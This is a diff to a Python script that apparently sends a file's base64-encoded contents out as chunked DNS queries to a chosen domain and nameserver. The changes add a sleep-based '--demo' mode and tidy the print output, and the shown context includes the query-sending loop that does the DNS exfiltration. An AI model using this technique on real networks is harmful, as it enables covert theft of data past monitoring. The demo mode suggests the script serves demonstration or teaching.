@@ -3,16 +3,18 @@ import argparse
 import os
 import base64
 import dns.resolver  # dnspython
+import time
 
 dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
 
 
 def valid_file(filename):
-    print('Testing if %s is a file.' % filename)
+    print('Testing if %s is a file:  ' % filename, end='')
     if not os.path.exists(filename):
+        print('No, it is not a file.')
         raise argparse.ArgumentTypeError('The file %s does not exist!' % filename)
     else:
-        print('Yes it is a file.')
+        print('Yes, it is a file.')
         return filename
 
 
@@ -32,6 +34,8 @@ parser.add_argument('--nameserver', '-n', '-ns', type=str, default='8.8.8.8',
                     help='Nameserver to query. (default: 8.8.8.8)')
 parser.add_argument('--verbose', '-v', action="store_true",
                     help='Verbose output. (default: none)')
+parser.add_argument('--demo', action="store_true",
+                    help='Demo mode. (default: none)')
 args = parser.parse_args()
 
 
@@ -58,16 +62,28 @@ def sendqueries(b64data):
     nameserver = args.nameserver
     dns.resolver.default_resolver.nameservers = [nameserver]
     b64array = [b64data[y-blocksize:y] for y in range(blocksize, len(b64data)+blocksize, blocksize)]
-    print('We are sending', len(b64array), 'queries to fit all the data.\n')
-    print('Using %s as our nameserver.\n' % nameserver)
+    print('We are sending', len(b64array), 'queries to fit all the data.')
+    print('Using %s as our nameserver.' % nameserver)
+    if args.demo:
+        makedots(5)
+    print('')
     counter = 1
     for word in b64array:
         queryname = word + '.' + domain
         print('Query %s %s %s' % (str(counter), queryname, type))
         result = dns.resolver.resolve(queryname, type)
+        if args.demo:
+            makedots(3)
         if args.verbose:
             print(str(result.response))
+            print('')
         counter += 1
+
+def makedots(sleepytime):
+    for counter in range(0, sleepytime):
+        print('. ', end = '')
+        time.sleep(1)
+    print('')
 
 
 if __name__ == "__main__":
